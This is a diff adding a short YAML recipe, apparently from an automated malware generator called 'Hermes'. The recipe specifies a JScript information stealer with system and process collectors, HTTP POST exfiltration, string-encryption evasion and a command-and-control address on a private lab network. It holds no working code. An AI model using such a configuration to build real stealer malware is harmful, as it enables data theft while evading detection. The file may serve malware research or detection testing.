@@ -1,0 +1,19 @@
+name: js_infostealer_cs_round2_v2
+description: Auto-generated recipe by Hermes (jscript)
+format: jscript
+core:
+- core/emit_buffer
+- core/run_cmd
+- core/file_ops
+collectors:
+- collectors/system_info
+- collectors/processes
+exfil: exfil/http_post
+arch: arch/sequential
+evasion:
+- evasion/behavioral_pacing
+- evasion/stack_strings
+- evasion/string_encrypt
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
